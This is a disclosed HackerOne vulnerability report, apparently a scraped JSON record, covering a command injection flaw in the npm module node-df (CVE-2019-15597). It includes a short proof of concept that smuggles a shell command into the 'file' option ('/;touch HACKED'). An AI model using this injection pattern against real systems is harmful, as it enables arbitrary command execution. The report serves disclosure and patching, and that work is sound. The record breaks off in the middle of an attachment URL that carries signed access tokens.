{"id":703412,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDM0MTI=","url":"https://hackerone.com/reports/703412","title":"[node-df] RCE via insecure command concatenation","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-09-28T09:11:41.085Z","submitted_at":"2019-09-28T09:11:41.085Z","is_member_of_team?":false,"is_organization_group_member?":false,"is_triager?":false,"reporter":{"disabled":false,"username":"mik317","url":"/mik317","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"},"is_me?":false,"cleared":false,"verified":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"pentest_retesting_ends_at":null,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program was used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"submitted_by_team_member":false,"submitted_with_assistant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-15597"],"singular_disclosure_disabled":false,"disclosed_at":"2019-12-04T19:33:22.380Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-12-04T19:33:13.799Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a `RCE` issue in the `node-df` module.\nIt allows to execute `arbitrary commands remotely inside the victim's PC`\n\n# Module\n**module name:** `node-df`\n**version:** `0.1.4`\n**npm page:** `https://www.npmjs.com/package/node-df`\n\n## Module Description\n\u003e node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.\n\n## Module Stats\n[N/A] downloads in the last day\n[3,023] downloads in the last week\n[N/A] downloads in the last month\n\n## Vulnerability Description\nThe issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: \n\n## Steps To Reproduce:\n1. Create the following PoC file:\n\n```js\n// poc.js\nvar df = require('node-df');\nvar options = {\n        file: '/;touch HACKED',\n        prefixMultiplier: 'GB',\n        isDisplayPrefixMultiplier: true,\n        precision: 2\n    };\n \ndf(options, function (error, response) {\n    if (error) { throw error; }\n \n    console.log(JSON.stringify(response, null, 2));\n});\n```\n1. Execute the following commands in terminal:\n\n```bash\nnpm i node-df # Install affected module\nls # Make sure there isn't any *HACKED* file\nnode poc.js #  Run the PoC\nls # The *HACKED* file has been created\n```\n1. The `HACKED` file will be created {F594172}\n\n## Patch\n\u003e Don't concatenate `commands` using insecure `user's inputs` :)\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\n`RCE` on `node-df` via `insecure command concatenation`","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":594172,"file_name":"Screencast_09-28-2019_09_11_28_AM.webm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w5BGM5Y8pHCRWDVsinTwwDWv?response-content-disposition=attachment%3B%20filename%3D%22Screencast_09-28-2019_09_11_28_AM.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_09-28-2019_09_11_28_AM.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYJPM5INV%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T091322Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECgaCXVzLXdlc3QtMiJGMEQCIGPTFP%2F%2B61NRXKxUCRRiOEw%2FyEXMoJI30jSWgewoYzlYAiATW70r0%2Ft4BCmx%2BIRRvI9N9Vm6tq25cJqmqyf8P9oJnSq6BQjx%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMlnlVa%2Fn%2F5%2FBwcq%2BdKo4F1YnOHtgpcuOI6MB5pFrZ1JRxajUzrmu66Bs%2BaH059f9y01fPv%2FrjUZqEro3Jo9934IhhUwQj4gQeQ52XFU4tL%2Fl7ANAcg%2BweyQf%2FlO3JCodLg6QOdgOquP7BbCsXjast8Pomf8KP1lmk7IIMD7J9DS4cjH6SQasi3CttqywzFCaRrB8cbzZNYwGpMcshlGieMrYvXOKXlnFS%2Bvyupk%2BdoPGms%2F3cgeV%2BcDw50A71YHut794drWOwB%2BEgOIDnJqc%2FodmOUDjNrGX2PYH98D58CQI6kF0KLfi9CZmpJrhPYWDkdXTTag4OHihpyrvYSsSmxgEN1mpxlQWp3qqjt9qoTl0ks45f5BDGWqJfXqS6BToA%2FyYcov9sqsrq4OPo9luLGlSC2n3bSDp7b0kZjA1KI8sleyE39CFdrHoEX%2B7oWvUWQgHphH3Q8BMmkSeejy70EmY5sY8nHxzxh7Dad05tIOqTFbZ%2BZgtuZT5FDbkFzkwFhf31nqsw52N8uaKjg5OC9zTWIMWPyYbEsjRy8ysfEI7wOyEgz4hKw42ZE%2BQwchRJVzjIfG%2FydQmIL81YK37dK7j5m3h3w8krlkcHtnFLeC%2FQmM%2BeodTy4V71S6ERtrAKr2ItxzM%2FteX%2B0%2FWpQeoI%2FChXa3DA%2FggHvAyucAKgMnjSUwBn57W9JZy%2BJSPzMSBw7F7UxXSoITzG6M%2BYz%2Bl09U6QBtVUdjQuAZplrNQ0IupzAaYZmnJHy4JHrTrLDgyzizvbVD9nG7AAnJurFmdE1TbZ%2BGJuAN5Y0bsF0mLXDzkgZR7DysR0C1rvYL3m0Br4yjjflY40H7Oziol2n3YJxG1BOJ32K08Mn6Q3qE3VPzBHy